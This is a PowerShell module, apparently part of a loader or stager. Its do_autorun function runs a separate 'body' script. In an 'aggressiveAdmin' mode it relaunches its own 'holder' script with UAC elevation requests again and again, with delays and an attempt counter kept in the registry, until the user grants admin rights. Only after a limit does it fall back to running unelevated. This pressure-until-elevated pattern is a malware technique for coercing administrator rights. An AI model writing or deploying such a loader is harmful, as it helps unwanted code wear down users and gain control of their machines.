. ./utils.ps1
. ./holder/consts_autoextract.ps1
. ./consts_body.ps1

function do_autorun()
{
    if ($server.aggressiveAdmin)
    {
        $limit = $server.aggressiveAdminTimes
        $times = RegReadParamInt -keyName "aggressiveAdminTimes"
        $elevated = IsElevated
        if ($elevated)
        {
            RunMe -script (Get-BodyPath) -repassArgs $false -argName "" -argValue "" -uac $true

            $times = $times + 1
            RegWriteParamInt -keyName "aggressiveAdminTimes" -value $times
        } 
        else 
        {
            if ($limit -gt 0)
            {
                writedbg "times= $times,aggressiveAdminTimes= $limit"
                if ($times -gt $limit)
                {
                    writedbg "no more times $times, running non elevated"
                    Start-Sleep -Seconds 4
                    RunMe -script (Get-BodyPath) -repassArgs $false -argName "" -argValue "" -uac $false
                    return
                }
            }

            $attempt = GetArgInt("attempt")
            $attempt = $attempt + 1
            $sleep = $server.aggressiveAdminDelay
            writedbg "Not elevated, sleeping: $sleep"
            Start-Sleep -Seconds $sleep
            if ($attempt -gt $server.aggressiveAdminAttempts)
            {
                writedbg "Not elevated run non-elevating body"
                Start-Sleep -Seconds 4
                RunMe -script (Get-BodyPath) -repassArgs $false -argName "" -argValue "" -uac $false    
            }
            else 
            {
                writedbg "trying to elevate holder"
                Start-Sleep -Seconds 4
                try {
                    RunMe -script (Get-ScriptPath) -repassArgs $true -argName "attempt" -argValue $attempt -uac $true  
                }
                catch {
                    RunMe -script (Get-ScriptPath) -repassArgs $true -argName "attempt" -argValue $attempt -uac $false  
                }
        
            }

        }

    }
    else 
    {
        try 
        {
            RunMe -script (Get-BodyPath) -repassArgs $false -argName "" -argValue "" -uac $true
        }
        catch {
            RunMe -script (Get-BodyPath) -repassArgs $false -argName "" -argValue "" -uac $false
        }
    }

}
